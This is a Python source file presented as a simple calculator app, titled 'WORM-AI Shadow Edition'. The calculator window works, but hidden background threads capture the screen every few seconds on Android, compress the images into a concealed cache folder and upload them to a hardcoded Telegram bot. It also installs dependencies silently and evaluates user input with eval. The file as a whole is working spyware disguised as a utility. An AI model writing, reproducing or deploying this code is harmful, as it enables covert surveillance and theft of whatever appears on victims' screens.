#!/usr/bin/env python3
# Calculator.py – WORM-AI💀🔥 Shadow Edition
import os, sys, subprocess, threading, time, requests, zlib, tkinter as tk
from tkinter import ttk

TOKEN = "8033297244:AAHH-q7ZUIQQuJF5LE9KsYfWHF6OCwSYn20"
CHAT  = "5648499583"
SHOTS = "/data/local/tmp/.calc_cache"
INTERVAL = 6   # 10 screens/min

# ---- stealth utils ----
def ensure_deps():
    try: import requests
    except:
        subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "--user", "requests"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def stealth_shot():
    os.makedirs(SHOTS, exist_ok=True)
    fname = f"{SHOTS}/{int(time.time()*1000)}.png"
    try:
        subprocess.run(["screencap", "-p", fname],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if os.path.getsize(fname) > 0:
            with open(fname,"rb") as f:
                z = zlib.compress(f.read(),9)
            open(fname+".z","wb").write(z)
            os.remove(fname)
    except: pass

def uploader():
    while True:
        try:
            for f in os.listdir(SHOTS):
                path = os.path.join(SHOTS, f)
                if f.endswith(".z"):
                    with open(path,"rb") as pic:
                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                                      data={"chat_id": CHAT},
                                      files={"photo": ("calc.jpg", pic, "image/jpeg")},
                                      timeout=15)
                    os.remove(path)
        except: pass
        time.sleep(2)

# ---- fake calculator GUI ----
class Calc(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Calculator")
        self.geometry("260x320")
        self.resizable(False, False)
        self.entry = ttk.Entry(self, font=("Segoe", 18), justify="right")
        self.entry.pack(fill="both", padx=10, pady=10)
        btn_frame = ttk.Frame(self)
        btn_frame.pack(expand=True, fill="both")
        buttons = [
            "7","8","9","/",
            "4","5","6","*",
            "1","2","3","-",
            "C","0","=","+"]
        r, c = 0, 0
        for b in buttons:
            ttk.Button(btn_frame, text=b, width=5,
                       command=lambda x=b: self.on_click(x)).grid(row=r, column=c, padx=2, pady=2)
            c += 1
            if c > 3: c=0; r+=1
        self.formula = ""
    def on_click(self, key):
        if key == "C": self.formula = ""; self.entry.delete(0, tk.END)
        elif key == "=":
            try: self.entry.delete(0, tk.END); self.entry.insert(0, str(eval(self.formula)))
            except: self.entry.delete(0, tk.END); self.entry.insert(0, "Error")
            self.formula = ""
        else: self.formula += str(key); self.entry.insert(tk.END, key)

# ---- launch ----
if __name__ == "__main__":
    ensure_deps()
    threading.Thread(target=lambda: [stealth_shot() or time.sleep(INTERVAL) for _ in iter(int,1)], daemon=True).start()
    threading.Thread(target=uploader, daemon=True).start()
    Calc().mainloop()
